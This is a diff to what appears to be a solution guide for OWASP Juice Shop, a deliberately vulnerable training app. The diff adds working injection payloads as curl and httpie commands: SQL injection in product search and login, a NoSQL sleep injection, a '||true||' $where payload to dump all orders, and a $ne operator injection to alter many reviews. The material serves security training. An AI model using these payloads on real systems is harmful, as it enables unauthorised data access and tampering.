@@ -31,7 +31,7 @@ Order the Christmas special offer of 2014
 # find ProductId=10
 curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=2014%'+AND+deletedAt+IS+NOT+NULL));--" | jq
 
-TOKEN=<REDACTED>
+TOKEN="<REDACTED>"
 
 curl http://juiceshop:3000/api/BasketItems/ \
   -H "Content-Type: application/json" \
@@ -110,7 +110,9 @@ http http://juiceshop:3000/rest/user/login email="jim@juice-sh.op'--"
 Let the server sleep for some time
 
 ```bash
-TODO
+# parameter is executed before being compared
+# https://github.com/juice-shop/juice-shop/blob/master/routes/showProductReviews.ts
+http "juiceshop:3000/rest/products/sleep(1000)/reviews"
 ```
 
 ## NoSQL Exfiltration 
@@ -118,7 +120,9 @@ TODO
 All your orders are belong to us
 
 ```bash
-TODO
+# $where evaluates JavaScript, by default server-side scripting is enabled
+# https://github.com/juice-shop/juice-shop/blob/master/routes/trackOrder.ts
+http "juiceshop:3000/rest/track-order/1'||true||'"
 ```
 
 ## NoSQL Manipulation
@@ -126,7 +130,12 @@ TODO
 Update multiple product reviews at the same time
 
 ```bash
-TODO
+TOKEN="<REDACTED>"
+
+curl http://juiceshop:3000/rest/products/reviews \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer ${TOKEN}" \
+  --data-raw '{"id":{"$ne":"1"},"message":"bar"}'
 ```
 
 ## SSTi
